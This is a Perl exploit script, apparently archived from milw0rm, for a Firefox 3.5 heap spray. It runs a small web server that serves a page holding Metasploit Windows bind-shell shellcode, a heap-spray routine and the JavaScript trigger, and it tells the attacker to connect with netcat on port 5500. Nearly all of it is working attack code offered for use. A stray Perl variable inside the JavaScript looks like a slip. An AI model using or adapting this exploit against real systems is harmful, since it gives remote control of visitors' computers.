##################################################
# FireFox 3.5 Heap Spray
# Discovered by: Simon Berry-Bryne
# Coded in Perl by netsoul, ALTO PARANA - Paraguay
# Contact: netsoul2 [at] gmail [dot] com
##################################################

#!/usr/bin/perl -w
use strict;
use POE::Component::Server::HTTP;
POE::Component::Server::HTTP->new(Port => my $port = 8080,
ContentHandler => {"/" =>  sub{$_[1]->push_header("Content-Type", "text/html"), $_[1]->content(<DATA>)}});

print "[-] Listening in port $port...\n[-] Sending payload...\n[-] After 30 secs try with netcat for connect in port 5500\n";
POE::Kernel->run();

__DATA__
<html>
<head>
<title>Exploiting Firefox 3.5</title>
<script language= javascript>
//windows - shell_bind_tcp - metasploit - encoding is shikata_ga_nai
var shellcode= unescape("%u6afc%u4deb%uf9e8%uffff%u60ff%u6c8b%u2424%u458b%u8b3c%u057c%u0178%u8bef" +
			"%u184f%u5f8b%u0120%u49eb%u348b%u018b%u31ee%u99c0%u84ac%u74c0%uc107%u0dca" +
			"%uc201%uf4eb%u543b%u2824%ue575%u5f8b%u0124%u66eb%u0c8b%u8b4b%u1c5f%ueb01" +
			"%u2c03%u898b%u246c%u611c%u31c3%u64db%u438b%u8b30%u0c40%u708b%uad1c%u408b" +
			"%u5e08%u8e68%u0e4e%u50ec%ud6ff%u5366%u6866%u3233%u7768%u3273%u545f%ud0ff" +
			"%ucb68%ufced%u503b%ud6ff%u895f%u66e5%ued81%u0208%u6a55%uff02%u68d0%u09d9" +
			"%uadf5%uff57%u53d6%u5353%u5353%u5343%u5343%ud0ff%u6866%u7c15%u5366%ue189" +
			"%u6895%u1aa4%uc770%uff57%u6ad6%u5110%uff55%u68d0%uada4%ue92e%uff57%u53d6" +
			"%uff55%u68d0%u49e5%u4986%uff57%u50d6%u5454%uff55%u93d0%ue768%uc679%u5779" +
			"%ud6ff%uff55%u66d0%u646a%u6866%u6d63%ue589%u506a%u2959%u89cc%u6ae7%u8944" +
			"%u31e2%uf3c0%ufeaa%u2d42%u42fe%u932c%u7a8d%uab38%uabab%u7268%ub3fe%uff16" +
			"%u4475%ud6ff%u575b%u5152%u5151%u016a%u5151%u5155%ud0ff%uad68%u05d9%u53ce" +
			"%ud6ff%uff6a%u37ff%ud0ff%u578b%u83fc%u64c4%ud6ff%uff52%u68d0%uceef%u60e0" +
			"%uff53%uffd6%u41d0");
oneblock = unescape("%u0c0c%u0c0c");
var fullblock = oneblock;
while (fullblock.length<0x60000)  
{
    fullblock += fullblock;
}
sprayContainer = new Array();
for (i=0; i<600; i++)  
{
    sprayContainer[i] = fullblock + shellcode;
}
var searchArray = new Array()
 
function escapeData(data)
{
 var i;
 var c;
 var escData='';
 for(i=0;i<data.length;i++)
  {
   c=data.charAt(i);$poe_kernel
   if(c=='&' || c=='?' || c=='=' || c=='%' || c==' ') c = escape(c);
   escData+=c;
  }
 return escData;
}
function DataTranslator(){
    searchArray = new Array();
    searchArray[0] = new Array();
    searchArray[0]["str"] = "blah";
    var newElement = document.getElementById("content")
    if (document.getElementsByTagName) {
        var i=0;
        pTags = newElement.getElementsByTagName("p")
        if (pTags.length > 0)  
        while (i<pTags.length)
        {
            oTags = pTags[i].getElementsByTagName("font")
            searchArray[i+1] = new Array()
            if (oTags[0])  
            {
                searchArray[i+1]["str"] = oTags[0].innerHTML;
            }
            i++
        }
    }
}
 
function GenerateHTML()
{
    var html = "";
    for (i=1;i<searchArray.length;i++)
    {
        html += escapeData(searchArray[i]["str"])
    }    
}
DataTranslator();
GenerateHTML()
</script>
</body>
</html>

# milw0rm.com [2009-07-20]
